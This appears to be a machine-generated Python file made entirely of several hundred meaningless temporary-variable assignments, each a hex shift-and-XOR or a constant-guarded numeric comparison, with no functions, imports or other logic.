tmp_m233 = (0xa3c7 >> 4) ^ 0x4f
tmp_l241 = (23 > 79) if True else (23 == 79)
tmp_l354 = (98 > 45) if False else (98 == 45)
tmp_m302 = (0x1659 >> 2) ^ 0x6c
tmp_l457 = (81 > 45) if False else (81 == 45)
tmp_m359 = (0xf1cd >> 4) ^ 0x8
tmp_l705 = (43 > 79) if False else (43 == 79)
tmp_l473 = (84 > 11) if False else (84 == 11)
tmp_l548 = (85 > 40) if True else (85 == 40)
tmp_m008 = (0x4cae >> 2) ^ 0xf2
tmp_m626 = (0xdc96 >> 1) ^ 0x3b
tmp_m237 = (0x7d79 >> 4) ^ 0xe8
tmp_m543 = (0x1c90 >> 3) ^ 0xbd
tmp_l286 = (39 > 31) if False else (39 == 31)
tmp_l455 = (34 > 74) if False else (34 == 74)
tmp_m846 = (0x68b >> 1) ^ 0x6c
tmp_l009 = (48 > 89) if False else (48 == 89)
tmp_m674 = (0x2d09 >> 2) ^ 0x4c
tmp_l492 = (99 > 27) if False else (99 == 27)
tmp_l746 = (10 > 3) if False else (10 == 3)
tmp_m405 = (0xf576 >> 3) ^ 0x7d
tmp_l760 = (55 > 36) if False else (55 == 36)
tmp_l618 = (61 > 94) if False else (61 == 94)
tmp_l127 = (89 > 32) if True else (89 == 32)
tmp_m443 = (0xf5e6 >> 4) ^ 0xb5
tmp_l740 = (99 > 37) if True else (99 == 37)
tmp_l542 = (98 > 10) if False else (98 == 10)
tmp_l052 = (43 > 20) if True else (43 == 20)
tmp_m636 = (0xf0a6 >> 1) ^ 0xb1
tmp_m483 = (0x4076 >> 3) ^ 0xee
tmp_l891 = (89 > 64) if True else (89 == 64)
tmp_l415 = (14 > 29) if True else (14 == 29)
tmp_l361 = (9 > 41) if True else (9 == 41)
tmp_m665 = (0xa9de >> 2) ^ 0x32
tmp_l418 = (40 > 4) if True else (40 == 4)
tmp_l765 = (69 > 21) if True else (69 == 21)
tmp_m639 = (0x4979 >> 3) ^ 0x8d
tmp_m809 = (0xa8d >> 1) ^ 0x81
tmp_m455 = (0x6f46 >> 2) ^ 0xa2
tmp_l454 = (96 > 13) if True else (96 == 13)
tmp_m247 = (0x7d3e >> 2) ^ 0x6c
tmp_m449 = (0x3152 >> 4) ^ 0xe7
tmp_l108 = (13 > 41) if True else (13 == 41)
tmp_l420 = (6 > 9) if True else (6 == 9)
tmp_l208 = (93 > 75) if False else (93 == 75)
tmp_l093 = (27 > 6) if False else (27 == 6)
tmp_l300 = (33 > 96) if False else (33 == 96)
tmp_l730 = (7 > 92) if True else (7 == 92)
tmp_m478 = (0x304e >> 1) ^ 0xc7
tmp_l490 = (99 > 13) if False else (99 == 13)
tmp_m761 = (0x5e2f >> 2) ^ 0x15
tmp_m860 = (0x2752 >> 4) ^ 0xd3
tmp_m559 = (0x61af >> 3) ^ 0x16
tmp_l239 = (64 > 10) if True else (64 == 10)
tmp_l558 = (73 > 8) if True else (73 == 8)
tmp_l191 = (46 > 44) if True else (46 == 44)
tmp_m309 = (0xebb6 >> 1) ^ 0xf5
tmp_m179 = (0x232f >> 3) ^ 0x81
tmp_l440 = (69 > 82) if True else (69 == 82)
tmp_l663 = (28 > 25) if False else (28 == 25)
tmp_m369 = (0xd2c6 >> 2) ^ 0x97
tmp_l130 = (55 > 33) if True else (55 == 33)
tmp_l576 = (8 > 43) if False else (8 == 43)
tmp_m324 = (0xf17b >> 3) ^ 0xc6
tmp_m167 = (0x2a8d >> 2) ^ 0xea
tmp_l046 = (82 > 43) if True else (82 == 43)
tmp_l655 = (57 > 35) if False else (57 == 35)
tmp_m210 = (0x7b74 >> 4) ^ 0x70
tmp_l559 = (96 > 28) if False else (96 == 28)
tmp_m675 = (0x54d9 >> 1) ^ 0x61
tmp_l282 = (63 > 82) if True else (63 == 82)
tmp_m598 = (0xb866 >> 2) ^ 0xdc
tmp_m650 = (0x7fb0 >> 3) ^ 0x7e
tmp_l546 = (40 > 95) if False else (40 == 95)
tmp_m402 = (0x2c12 >> 2) ^ 0x1e
tmp_m552 = (0x8dfd >> 2) ^ 0xf0
tmp_l054 = (16 > 3) if True else (16 == 3)
tmp_m779 = (0xf893 >> 1) ^ 0x19
tmp_m048 = (0xdef0 >> 4) ^ 0x29
tmp_l118 = (34 > 5) if True else (34 == 5)
tmp_l487 = (52 > 68) if False else (52 == 68)
tmp_l785 = (97 > 70) if True else (97 == 70)
tmp_m655 = (0xba21 >> 2) ^ 0xf0
tmp_l311 = (16 > 100) if True else (16 == 100)
tmp_m032 = (0xb8db >> 4) ^ 0x23
tmp_l010 = (26 > 14) if True else (26 == 14)
tmp_m634 = (0x8290 >> 1) ^ 0xd2
tmp_m436 = (0xc768 >> 4) ^ 0xb5
tmp_m479 = (0x5967 >> 3) ^ 0x3a
tmp_m560 = (0x22eb >> 3) ^ 0x79
tmp_l390 = (25 > 90) if False else (25 == 90)
tmp_m771 = (0xd79a >> 4) ^ 0x9f
tmp_l598 = (92 > 90) if False else (92 == 90)
tmp_l463 = (41 > 8) if True else (41 == 8)
tmp_l158 = (2 > 28) if False else (2 == 28)
tmp_l602 = (84 > 53) if False else (84 == 53)
tmp_m742 = (0xa15c >> 3) ^ 0x32
tmp_l321 = (58 > 45) if True else (58 == 45)
tmp_l066 = (76 > 22) if False else (76 == 22)
tmp_m349 = (0xa7ec >> 2) ^ 0xeb
tmp_m068 = (0x5b20 >> 4) ^ 0xc9
tmp_l761 = (61 > 1) if True else (61 == 1)
tmp_m834 = (0xf2cb >> 4) ^ 0xd1
tmp_l758 = (16 > 79) if True else (16 == 79)
tmp_l112 = (85 > 7) if True else (85 == 7)
tmp_l337 = (44 > 15) if False else (44 == 15)
tmp_m472 = (0x4618 >> 3) ^ 0xf0
tmp_l830 = (88 > 95) if False else (88 == 95)
tmp_m399 = (0xfdcf >> 1) ^ 0xff
tmp_l784 = (93 > 85) if True else (93 == 85)
tmp_m775 = (0xd8bb >> 1) ^ 0xa0
tmp_m714 = (0xb928 >> 2) ^ 0xf2
tmp_m162 = (0x3a43 >> 3) ^ 0x2a
tmp_l437 = (45 > 29) if False else (45 == 29)
tmp_m067 = (0xc15d >> 2) ^ 0xc
tmp_l210 = (56 > 6) if False else (56 == 6)
tmp_m151 = (0xda97 >> 3) ^ 0xed
tmp_m268 = (0xd88f >> 1) ^ 0x1c
tmp_l595 = (8 > 93) if True else (8 == 93)
tmp_l218 = (38 > 41) if False else (38 == 41)
tmp_m830 = (0x14fa >> 2) ^ 0x2a
tmp_m260 = (0xae12 >> 2) ^ 0x98
tmp_l162 = (61 > 27) if False else (61 == 27)
tmp_l688 = (76 > 4) if False else (76 == 4)
tmp_m194 = (0x8ba4 >> 4) ^ 0xe2
tmp_m256 = (0xb18a >> 4) ^ 0x94
tmp_m748 = (0xeb88 >> 3) ^ 0xea
tmp_m658 = (0x467b >> 3) ^ 0x39
tmp_m654 = (0xdd71 >> 2) ^ 0x5
tmp_l647 = (85 > 44) if False else (85 == 44)
tmp_m050 = (0xbb66 >> 4) ^ 0x8d
tmp_l575 = (87 > 70) if True else (87 == 70)
tmp_l347 = (63 > 96) if False else (63 == 96)
tmp_m019 = (0x3f41 >> 4) ^ 0x9b
tmp_m400 = (0x9286 >> 2) ^ 0x99
tmp_l403 = (12 > 9) if False else (12 == 9)
tmp_m516 = (0xf142 >> 4) ^ 0x99
tmp_l026 = (100 > 92) if True else (100 == 92)
tmp_l075 = (34 > 53) if True else (34 == 53)
tmp_l877 = (9 > 92) if False else (9 == 92)
tmp_l366 = (57 > 96) if False else (57 == 96)
tmp_l699 = (90 > 96) if False else (90 == 96)
tmp_m058 = (0xd388 >> 4) ^ 0x4
tmp_m421 = (0x8719 >> 1) ^ 0x12
tmp_m537 = (0x84ee >> 2) ^ 0x64
tmp_m822 = (0x8996 >> 4) ^ 0xfa
tmp_l841 = (49 > 26) if True else (49 == 26)
tmp_l407 = (65 > 98) if True else (65 == 98)
tmp_m532 = (0x7482 >> 4) ^ 0x82
tmp_m693 = (0xdc59 >> 3) ^ 0x69
tmp_m026 = (0x94f8 >> 2) ^ 0x99
tmp_m835 = (0x9b80 >> 4) ^ 0x9a
tmp_m432 = (0xd08a >> 2) ^ 0x4d
tmp_m686 = (0x7091 >> 2) ^ 0x13
tmp_m695 = (0xf177 >> 4) ^ 0x7c
tmp_m444 = (0x724a >> 3) ^ 0x5d
tmp_l894 = (72 > 1) if False else (72 == 1)
tmp_m841 = (0x9a77 >> 1) ^ 0x48
tmp_m407 = (0x5241 >> 1) ^ 0xf0
tmp_l661 = (52 > 82) if True else (52 == 82)
tmp_m768 = (0xf172 >> 1) ^ 0x2a
tmp_l695 = (25 > 70) if False else (25 == 70)
tmp_m574 = (0x9c8c >> 1) ^ 0x8e
tmp_m244 = (0x7d8e >> 4) ^ 0x2
tmp_l692 = (27 > 22) if False else (27 == 22)
tmp_l526 = (79 > 15) if True else (79 == 15)
tmp_m894 = (0x41f1 >> 2) ^ 0xec
tmp_l248 = (91 > 72) if True else (91 == 72)
tmp_l237 = (19 > 94) if True else (19 == 94)
tmp_l673 = (2 > 41) if True else (2 == 41)
tmp_l404 = (51 > 40) if True else (51 == 40)
tmp_m746 = (0x2dac >> 2) ^ 0xe4
tmp_l703 = (4 > 23) if True else (4 == 23)
tmp_m624 = (0x4af0 >> 4) ^ 0xb6
tmp_l803 = (30 > 92) if True else (30 == 92)
tmp_m728 = (0x4ace >> 3) ^ 0xb9
tmp_m269 = (0x1ed7 >> 3) ^ 0xe6
tmp_m789 = (0x6d44 >> 4) ^ 0x17
tmp_l252 = (25 > 35) if True else (25 == 35)
tmp_l314 = (68 > 92) if True else (68 == 92)
tmp_m592 = (0x8d07 >> 2) ^ 0xc0
tmp_l100 = (78 > 82) if True else (78 == 82)
tmp_m811 = (0xfd92 >> 2) ^ 0x41
tmp_l088 = (13 > 16) if False else (13 == 16)
tmp_m155 = (0x4d1f >> 3) ^ 0xa4
tmp_m872 = (0x5ea >> 4) ^ 0xa5
tmp_l279 = (65 > 7) if False else (65 == 7)
tmp_m280 = (0x6e5 >> 4) ^ 0xd1
tmp_m123 = (0x4ada >> 1) ^ 0x5f
tmp_l273 = (21 > 60) if True else (21 == 60)
tmp_m023 = (0x2d9e >> 2) ^ 0xa5
tmp_l687 = (28 > 26) if False else (28 == 26)
tmp_m298 = (0xa952 >> 4) ^ 0x17
tmp_l155 = (74 > 23) if True else (74 == 23)
tmp_m012 = (0x21f7 >> 4) ^ 0xfd
tmp_l764 = (96 > 68) if True else (96 == 68)
tmp_m692 = (0xf334 >> 4) ^ 0xf6
tmp_m132 = (0xa634 >> 2) ^ 0x2e
tmp_m731 = (0xe46f >> 3) ^ 0x8f
tmp_l519 = (79 > 84) if True else (79 == 84)
tmp_m284 = (0x9fb1 >> 1) ^ 0xbe
tmp_l480 = (90 > 62) if False else (90 == 62)
tmp_m804 = (0x74bc >> 2) ^ 0xf
tmp_m412 = (0xcecf >> 1) ^ 0x35
tmp_l813 = (50 > 44) if False else (50 == 44)
tmp_l648 = (100 > 21) if False else (100 == 21)
tmp_m802 = (0x414d >> 2) ^ 0x37
tmp_l276 = (38 > 66) if False else (38 == 66)
tmp_l391 = (81 > 4) if False else (81 == 4)
tmp_l478 = (41 > 84) if False else (41 == 84)
tmp_l421 = (9 > 44) if False else (9 == 44)
tmp_l278 = (17 > 38) if True else (17 == 38)
tmp_m241 = (0x8497 >> 1) ^ 0xa4
tmp_m599 = (0xd3ae >> 2) ^ 0x18
tmp_m334 = (0x3361 >> 4) ^ 0x74
tmp_m660 = (0x2319 >> 4) ^ 0xbf
tmp_l569 = (83 > 15) if False else (83 == 15)
tmp_m790 = (0x96d1 >> 3) ^ 0xcb
tmp_l656 = (11 > 40) if False else (11 == 40)
tmp_l816 = (26 > 75) if False else (26 == 75)
tmp_m362 = (0x5d2a >> 2) ^ 0x9b
tmp_m336 = (0x5aa >> 4) ^ 0x3b
tmp_l507 = (39 > 10) if True else (39 == 10)
tmp_m378 = (0xa2b8 >> 2) ^ 0x47
tmp_m216 = (0xe0f8 >> 4) ^ 0x4
tmp_l013 = (5 > 18) if False else (5 == 18)
tmp_m518 = (0x3c41 >> 4) ^ 0xd8
tmp_l855 = (85 > 32) if True else (85 == 32)
tmp_m345 = (0x2732 >> 2) ^ 0xf7
tmp_m227 = (0xf5b0 >> 1) ^ 0x48
tmp_l377 = (30 > 4) if True else (30 == 4)
tmp_m301 = (0xf8e >> 1) ^ 0x3c
tmp_m758 = (0xf02 >> 2) ^ 0x1d
tmp_m508 = (0x3270 >> 3) ^ 0x6b
tmp_m788 = (0x2818 >> 4) ^ 0xbc
tmp_m897 = (0x1e74 >> 2) ^ 0x2b
tmp_l635 = (69 > 11) if False else (69 == 11)
tmp_l750 = (63 > 62) if True else (63 == 62)
tmp_m339 = (0xd70c >> 2) ^ 0x1b
tmp_m325 = (0x3ecf >> 2) ^ 0x33
tmp_l380 = (93 > 88) if False else (93 == 88)
tmp_m787 = (0x6dd3 >> 3) ^ 0x48
tmp_l011 = (89 > 49) if False else (89 == 49)
tmp_m540 = (0x86c8 >> 1) ^ 0xbd
tmp_l128 = (19 > 25) if False else (19 == 25)
tmp_l562 = (81 > 5) if False else (81 == 5)
tmp_l709 = (9 > 81) if False else (9 == 81)
tmp_l566 = (68 > 7) if False else (68 == 7)
tmp_l186 = (18 > 80) if False else (18 == 80)
tmp_l812 = (28 > 80) if False else (28 == 80)
tmp_m567 = (0x4210 >> 4) ^ 0x53
tmp_l315 = (99 > 79) if False else (99 == 79)
tmp_l469 = (65 > 39) if True else (65 == 39)
tmp_m296 = (0x6096 >> 1) ^ 0xe8
tmp_m215 = (0x933a >> 1) ^ 0x6a
tmp_m702 = (0x22a9 >> 3) ^ 0xe1
tmp_l749 = (18 > 11) if True else (18 == 11)
tmp_m609 = (0xa2e1 >> 4) ^ 0x4
tmp_m668 = (0xe8db >> 4) ^ 0x8
tmp_l150 = (2 > 74) if True else (2 == 74)
tmp_l859 = (50 > 97) if False else (50 == 97)
tmp_m727 = (0xfbad >> 1) ^ 0x62
tmp_m320 = (0x7575 >> 1) ^ 0x8f
tmp_m003 = (0x873b >> 2) ^ 0x1b
tmp_l423 = (91 > 50) if True else (91 == 50)
tmp_l521 = (26 > 62) if False else (26 == 62)
tmp_l183 = (94 > 8) if True else (94 == 8)
tmp_m577 = (0xcf36 >> 2) ^ 0x3c
tmp_m546 = (0x84e3 >> 4) ^ 0xec
tmp_l606 = (85 > 73) if True else (85 == 73)
tmp_l573 = (25 > 18) if False else (25 == 18)
tmp_m107 = (0x470e >> 2) ^ 0x60
tmp_m071 = (0xc818 >> 4) ^ 0x7
tmp_l641 = (61 > 30) if False else (61 == 30)
tmp_m160 = (0xa0dd >> 4) ^ 0x28
tmp_l434 = (46 > 14) if True else (46 == 14)
tmp_m810 = (0x63a7 >> 1) ^ 0xe0
tmp_l536 = (91 > 58) if False else (91 == 58)
tmp_l651 = (80 > 97) if True else (80 == 97)
tmp_l878 = (39 > 41) if False else (39 == 41)
tmp_m290 = (0xebe0 >> 4) ^ 0x6d
tmp_m392 = (0x59b9 >> 3) ^ 0x15
tmp_l069 = (32 > 48) if False else (32 == 48)
tmp_l196 = (59 > 73) if False else (59 == 73)
tmp_l336 = (36 > 12) if False else (36 == 12)
tmp_l405 = (3 > 5) if True else (3 == 5)
tmp_l613 = (40 > 70) if True else (40 == 70)
tmp_l260 = (94 > 97) if True else (94 == 97)
tmp_m664 = (0x2013 >> 4) ^ 0xc5
tmp_l163 = (63 > 93) if True else (63 == 93)
tmp_l511 = (72 > 14) if True else (72 == 14)
tmp_l711 = (92 > 23) if True else (92 == 23)
tmp_m311 = (0xbfb7 >> 3) ^ 0x15
tmp_l442 = (49 > 16) if True else (49 == 16)
tmp_l728 = (12 > 53) if True else (12 == 53)
tmp_m504 = (0xa382 >> 2) ^ 0xe2
tmp_m773 = (0xf35 >> 2) ^ 0xcc
tmp_m535 = (0xb7d4 >> 4) ^ 0x7f
tmp_l716 = (62 > 12) if True else (62 == 12)
tmp_m366 = (0xa54d >> 4) ^ 0xfd
tmp_l334 = (90 > 72) if True else (90 == 72)
tmp_m395 = (0xed7f >> 1) ^ 0x15
tmp_l465 = (2 > 95) if False else (2 == 95)
tmp_l880 = (47 > 77) if True else (47 == 77)
tmp_m704 = (0xfd48 >> 4) ^ 0xde
tmp_m104 = (0x3793 >> 3) ^ 0xa0
tmp_l103 = (26 > 66) if False else (26 == 66)
tmp_l886 = (75 > 86) if False else (75 == 86)
tmp_l283 = (93 > 53) if True else (93 == 53)
tmp_m568 = (0x71a >> 1) ^ 0x23
tmp_m010 = (0xf92e >> 1) ^ 0x47
tmp_m703 = (0x33cd >> 4) ^ 0x65
tmp_m739 = (0xda36 >> 1) ^ 0xc5
tmp_l482 = (62 > 59) if True else (62 == 59)
tmp_l540 = (25 > 71) if True else (25 == 71)
tmp_m565 = (0x7fb2 >> 3) ^ 0x7d
tmp_m652 = (0x2d95 >> 4) ^ 0xd8
tmp_m578 = (0xe388 >> 1) ^ 0x85
tmp_l345 = (69 > 95) if True else (69 == 95)
tmp_l123 = (44 > 16) if False else (44 == 16)
tmp_m461 = (0xebf8 >> 2) ^ 0xd1
tmp_l678 = (98 > 72) if False else (98 == 72)
tmp_m489 = (0xc9cd >> 2) ^ 0x21
tmp_l538 = (97 > 27) if False else (97 == 27)
tmp_m240 = (0x10f1 >> 2) ^ 0x5c
tmp_m491 = (0xcb67 >> 3) ^ 0x9e
tmp_l136 = (82 > 27) if True else (82 == 27)
tmp_m600 = (0xcfe1 >> 1) ^ 0xca
tmp_l777 = (16 > 60) if False else (16 == 60)
tmp_l257 = (7 > 15) if False else (7 == 15)
tmp_m766 = (0x8020 >> 2) ^ 0xe9
tmp_l427 = (27 > 39) if True else (27 == 39)
tmp_l483 = (53 > 64) if False else (53 == 64)
tmp_l626 = (12 > 9) if False else (12 == 9)
tmp_m264 = (0x8cdd >> 2) ^ 0x24
tmp_m445 = (0x635c >> 1) ^ 0xfd
tmp_l139 = (46 > 43) if False else (46 == 43)
tmp_m800 = (0x2d6d >> 4) ^ 0xaa
tmp_l897 = (24 > 29) if True else (24 == 29)
tmp_m199 = (0x7928 >> 2) ^ 0x57
tmp_m659 = (0xc32b >> 4) ^ 0x29
tmp_m385 = (0x6a4 >> 4) ^ 0xc8
tmp_m283 = (0xc309 >> 4) ^ 0xae
tmp_m815 = (0x2aa2 >> 3) ^ 0x7a
tmp_m497 = (0xc4f3 >> 3) ^ 0xfa
tmp_m354 = (0x8998 >> 1) ^ 0x22
tmp_m327 = (0xf92f >> 2) ^ 0x6c
tmp_m211 = (0xae94 >> 1) ^ 0x4f
tmp_l235 = (76 > 76) if False else (76 == 76)
tmp_m821 = (0xd94b >> 3) ^ 0x20
tmp_m651 = (0x9b27 >> 3) ^ 0x24
tmp_l209 = (6 > 39) if True else (6 == 39)
tmp_m837 = (0xc7ad >> 1) ^ 0x2b
tmp_m623 = (0x3e45 >> 4) ^ 0xb0
tmp_l572 = (56 > 50) if True else (56 == 50)
tmp_l289 = (86 > 18) if True else (86 == 18)
tmp_l043 = (49 > 55) if False else (49 == 55)
tmp_l732 = (68 > 58) if False else (68 == 58)
tmp_l132 = (100 > 25) if True else (100 == 25)
tmp_m423 = (0x8e59 >> 3) ^ 0xe2
tmp_l023 = (72 > 44) if True else (72 == 44)
tmp_m514 = (0xc7c9 >> 2) ^ 0xf6
tmp_m842 = (0xd9c6 >> 2) ^ 0xb4
tmp_m653 = (0x457f >> 2) ^ 0x92
tmp_m502 = (0xf524 >> 2) ^ 0xe6
tmp_l472 = (87 > 76) if True else (87 == 76)
tmp_m106 = (0xb5fc >> 4) ^ 0x72
tmp_m512 = (0x294c >> 4) ^ 0xa2
tmp_m059 = (0x3672 >> 1) ^ 0xae
tmp_l577 = (91 > 87) if True else (91 == 87)
tmp_l379 = (19 > 60) if False else (19 == 60)
tmp_l788 = (81 > 31) if True else (81 == 31)
tmp_m333 = (0x9711 >> 2) ^ 0xae
tmp_l885 = (52 > 100) if True else (52 == 100)
tmp_l149 = (35 > 64) if False else (35 == 64)
tmp_l583 = (54 > 53) if False else (54 == 53)
tmp_m148 = (0x9ab0 >> 3) ^ 0x88
tmp_m110 = (0x4874 >> 3) ^ 0x69
tmp_m158 = (0xb6ce >> 1) ^ 0x74
tmp_l707 = (99 > 64) if False else (99 == 64)
tmp_m406 = (0x2e78 >> 1) ^ 0x56
tmp_m521 = (0x3689 >> 4) ^ 0x7b
tmp_m108 = (0x82cd >> 4) ^ 0x85
tmp_m047 = (0x640c >> 4) ^ 0xda
tmp_m883 = (0xcde8 >> 3) ^ 0x4
tmp_l624 = (54 > 55) if False else (54 == 55)
tmp_m488 = (0xdd68 >> 3) ^ 0x16
tmp_m051 = (0x1b1d >> 1) ^ 0x21
tmp_m798 = (0xa8f8 >> 4) ^ 0x7a
tmp_m587 = (0xcfc9 >> 4) ^ 0xf3
tmp_l774 = (46 > 71) if True else (46 == 71)
tmp_l708 = (53 > 38) if False else (53 == 38)
tmp_m486 = (0xd73e >> 2) ^ 0xb0
tmp_m371 = (0x6bb0 >> 4) ^ 0x7d
tmp_m468 = (0x740d >> 1) ^ 0xcc
tmp_l495 = (93 > 99) if False else (93 == 99)
tmp_l585 = (1 > 100) if True else (1 == 100)
tmp_m054 = (0x3283 >> 4) ^ 0xb
tmp_l858 = (93 > 24) if False else (93 == 24)
tmp_m318 = (0xaba6 >> 1) ^ 0x45
tmp_m553 = (0xf3d9 >> 2) ^ 0x57
tmp_l609 = (66 > 76) if True else (66 == 76)
tmp_m796 = (0x64aa >> 4) ^ 0xd4
tmp_m898 = (0x9c99 >> 1) ^ 0x93
tmp_l819 = (38 > 8) if False else (38 == 8)
tmp_l355 = (54 > 59) if True else (54 == 59)
tmp_l406 = (16 > 74) if False else (16 == 74)
tmp_l254 = (47 > 9) if True else (47 == 9)
tmp_m859 = (0xca9f >> 2) ^ 0xf4
tmp_l359 = (95 > 73) if True else (95 == 73)
tmp_m740 = (0x6921 >> 3) ^ 0x68
tmp_m007 = (0x3f66 >> 2) ^ 0x84
tmp_m347 = (0x3032 >> 2) ^ 0xeb
tmp_l301 = (58 > 80) if True else (58 == 80)
tmp_m840 = (0x203c >> 4) ^ 0xce
tmp_l757 = (42 > 62) if True else (42 == 62)
tmp_m044 = (0xab4b >> 3) ^ 0x67
tmp_m632 = (0xcfce >> 1) ^ 0x9d
tmp_l614 = (4 > 46) if True else (4 == 46)
tmp_m376 = (0xcd65 >> 4) ^ 0x42
tmp_l831 = (18 > 47) if True else (18 == 47)
tmp_m572 = (0xe25 >> 2) ^ 0x9d
tmp_l124 = (75 > 24) if False else (75 == 24)
tmp_m246 = (0x53e5 >> 2) ^ 0x97
tmp_m469 = (0x86d0 >> 4) ^ 0x89
tmp_l681 = (70 > 32) if False else (70 == 32)
tmp_l444 = (5 > 31) if True else (5 == 31)
tmp_m316 = (0xe1a3 >> 2) ^ 0x8a
tmp_m355 = (0xf89e >> 1) ^ 0xe9
tmp_m460 = (0x3cf6 >> 3) ^ 0x77
tmp_m575 = (0x8978 >> 2) ^ 0x25
tmp_l051 = (72 > 6) if False else (72 == 6)
tmp_m235 = (0xeaf4 >> 1) ^ 0xee
tmp_l646 = (45 > 72) if False else (45 == 72)
tmp_l086 = (87 > 17) if False else (87 == 17)
tmp_l556 = (2 > 10) if True else (2 == 10)
tmp_l087 = (38 > 25) if False else (38 == 25)
tmp_l622 = (81 > 88) if False else (81 == 88)
tmp_m190 = (0x825b >> 1) ^ 0xfc
tmp_l431 = (29 > 54) if True else (29 == 54)
tmp_m803 = (0xbf92 >> 4) ^ 0xb1
tmp_m141 = (0x3fce >> 3) ^ 0x68
tmp_l896 = (8 > 100) if True else (8 == 100)
tmp_l450 = (67 > 2) if True else (67 == 2)
tmp_m313 = (0xba3e >> 4) ^ 0x57
tmp_m024 = (0xddef >> 2) ^ 0x43
tmp_m297 = (0x409a >> 4) ^ 0x61
tmp_m667 = (0x51f1 >> 2) ^ 0x84
tmp_l723 = (35 > 5) if True else (35 == 5)
tmp_l032 = (65 > 11) if False else (65 == 11)
tmp_m816 = (0x4412 >> 4) ^ 0xe1
tmp_l299 = (60 > 66) if True else (60 == 66)
tmp_m677 = (0x6785 >> 4) ^ 0x60
tmp_l713 = (7 > 40) if False else (7 == 40)
tmp_l445 = (92 > 45) if False else (92 == 45)
tmp_m638 = (0x8fe3 >> 3) ^ 0x44
tmp_m029 = (0xa383 >> 2) ^ 0xa6
tmp_l215 = (52 > 57) if True else (52 == 57)
tmp_l639 = (7 > 51) if True else (7 == 51)
tmp_l206 = (56 > 61) if False else (56 == 61)
tmp_l664 = (23 > 33) if False else (23 == 33)
tmp_l610 = (80 > 7) if True else (80 == 7)
tmp_l581 = (16 > 53) if False else (16 == 53)
tmp_m357 = (0x9719 >> 2) ^ 0x65
tmp_m220 = (0x222b >> 3) ^ 0x43
tmp_l275 = (45 > 35) if False else (45 == 35)
tmp_l554 = (26 > 50) if True else (26 == 50)
tmp_m434 = (0xe9cf >> 1) ^ 0xf0
tmp_m236 = (0xcde3 >> 4) ^ 0xa3
tmp_l611 = (70 > 30) if True else (70 == 30)
tmp_m411 = (0x4384 >> 2) ^ 0xb7
tmp_m530 = (0xf000 >> 4) ^ 0x2b
tmp_l868 = (61 > 46) if False else (61 == 46)
tmp_l426 = (4 > 66) if False else (4 == 66)
tmp_m306 = (0xbec5 >> 1) ^ 0x65
tmp_m525 = (0xf1bf >> 4) ^ 0xbe
tmp_l261 = (7 > 52) if False else (7 == 52)
tmp_m209 = (0x3e4a >> 3) ^ 0x92
tmp_m556 = (0x83aa >> 3) ^ 0xe7
tmp_l287 = (69 > 4) if False else (69 == 4)
tmp_m582 = (0x8b48 >> 1) ^ 0x63
tmp_l438 = (40 > 35) if True else (40 == 35)
tmp_m326 = (0x4e30 >> 4) ^ 0x81
tmp_m122 = (0x3dbf >> 3) ^ 0xe0
tmp_m263 = (0x9f3e >> 4) ^ 0x7e
tmp_m082 = (0x9b62 >> 1) ^ 0x3d
tmp_m096 = (0x6c24 >> 2) ^ 0x75
tmp_l360 = (75 > 54) if True else (75 == 54)
tmp_l890 = (43 > 91) if True else (43 == 91)
tmp_l221 = (64 > 65) if True else (64 == 65)
tmp_l004 = (24 > 1) if True else (24 == 1)
tmp_m682 = (0xb011 >> 2) ^ 0x8d
tmp_m430 = (0xcf89 >> 2) ^ 0x19
tmp_m618 = (0xf52f >> 4) ^ 0x5f
tmp_m134 = (0x2df4 >> 2) ^ 0x53
tmp_l800 = (12 > 94) if True else (12 == 94)
tmp_m172 = (0x4ef8 >> 1) ^ 0x9c
tmp_l272 = (58 > 24) if False else (58 == 24)
tmp_m085 = (0xc8d4 >> 1) ^ 0xb
tmp_l464 = (44 > 4) if True else (44 == 4)
tmp_m805 = (0xffed >> 2) ^ 0xd3
tmp_m295 = (0x4f7b >> 2) ^ 0x24
tmp_m496 = (0xbe6d >> 3) ^ 0x18
tmp_m786 = (0x72b9 >> 2) ^ 0x59
tmp_m606 = (0xe648 >> 4) ^ 0x2c
tmp_m844 = (0x4a93 >> 1) ^ 0x8d
tmp_m696 = (0x54b6 >> 1) ^ 0x92
tmp_l620 = (65 > 76) if True else (65 == 76)
tmp_m218 = (0x927a >> 2) ^ 0x16
tmp_l860 = (34 > 6) if True else (34 == 6)
tmp_l385 = (8 > 92) if True else (8 == 92)
tmp_m708 = (0x400c >> 1) ^ 0x7
tmp_l005 = (61 > 12) if True else (61 == 12)
tmp_l035 = (48 > 47) if False else (48 == 47)
tmp_l775 = (16 > 7) if True else (16 == 7)
tmp_l234 = (16 > 48) if True else (16 == 48)
tmp_m662 = (0xa280 >> 1) ^ 0x9d
tmp_m281 = (0x74e >> 2) ^ 0xec
tmp_l356 = (44 > 27) if False else (44 == 27)
tmp_l513 = (18 > 23) if True else (18 == 23)
tmp_m485 = (0x63d5 >> 2) ^ 0x4a
tmp_l797 = (100 > 71) if True else (100 == 71)
tmp_m069 = (0x775c >> 2) ^ 0x96
tmp_l875 = (54 > 92) if False else (54 == 92)
tmp_l496 = (41 > 33) if True else (41 == 33)
tmp_l188 = (6 > 73) if True else (6 == 73)
tmp_m865 = (0x9769 >> 3) ^ 0x61
tmp_m698 = (0xdf7d >> 4) ^ 0xc4
tmp_l204 = (99 > 4) if True else (99 == 4)
tmp_m881 = (0x7748 >> 3) ^ 0x62
tmp_l560 = (72 > 3) if False else (72 == 3)
tmp_l790 = (12 > 80) if False else (12 == 80)
tmp_m887 = (0xd555 >> 3) ^ 0x4d
tmp_m470 = (0x8031 >> 2) ^ 0xed
tmp_l253 = (84 > 2) if False else (84 == 2)
tmp_l845 = (67 > 22) if False else (67 == 22)
tmp_m319 = (0xbfa7 >> 3) ^ 0xb0
tmp_m126 = (0x81ea >> 1) ^ 0x19
tmp_l498 = (35 > 67) if True else (35 == 67)
tmp_m020 = (0x13de >> 2) ^ 0xe1
tmp_m186 = (0xe3df >> 1) ^ 0x3c
tmp_m533 = (0xd078 >> 2) ^ 0xf3
tmp_m701 = (0xdd03 >> 2) ^ 0xfe
tmp_m030 = (0xb074 >> 4) ^ 0x25
tmp_l111 = (86 > 40) if False else (86 == 40)
tmp_l535 = (89 > 95) if False else (89 == 95)
tmp_l305 = (97 > 70) if False else (97 == 70)
tmp_l827 = (31 > 97) if False else (31 == 97)
tmp_l710 = (68 > 73) if False else (68 == 73)
tmp_m255 = (0x1524 >> 4) ^ 0xd0
tmp_m520 = (0xa904 >> 2) ^ 0xff
tmp_l271 = (77 > 27) if False else (77 == 27)
tmp_m566 = (0x3918 >> 2) ^ 0x58
tmp_l207 = (100 > 51) if False else (100 == 51)
